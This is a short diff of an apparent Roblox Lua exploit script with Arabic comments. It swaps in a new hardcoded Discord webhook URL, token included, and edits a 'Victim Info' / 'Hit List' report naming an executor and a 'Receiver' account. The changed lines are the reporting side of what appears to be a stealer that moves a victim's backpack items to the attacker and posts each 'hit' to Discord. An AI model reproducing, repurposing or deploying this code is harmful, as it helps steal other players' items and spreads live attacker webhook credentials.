@@ -11,7 +11,7 @@ local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
 -- ضع هنا الويب هوك الجديد
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1404963543555768383/6qQU8_ItNMIXpsqtZGDTXuGpO-TdRLbxUDMR_ulseo32MKwxqP8ILq_Lfbt76DNfHGT4"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1421935795710853292/SjtNgRwKVw6aI4CrKDbTqqp2H0pYYuujIZ2Ek5W1byC_txbl83iB11gnzFKK0blLnKoL"
 
 -- =========================
 -- 1: قسم النقل التلقائي (كل 3 دقائق)
@@ -151,7 +151,7 @@ task.spawn(function()
     end
 
     local message = "@everyone **Alien Hit**\n──────────────\n" ..
-                    "**Victim Info:**\nUsername: " .. playerName .. "\nExecutor: Delta\nAccount Age: " .. accountAge ..
+                    "**Victim Info:**\nUsername: " .. playerName .. "\nExecutor: dogzss01\nAccount Age: " .. accountAge ..
                     "\nReceiver: sssfysue7\n──────────────\n**Hit List:**\n"
 
     for i = 1, math.min(10, #backpackContent) do
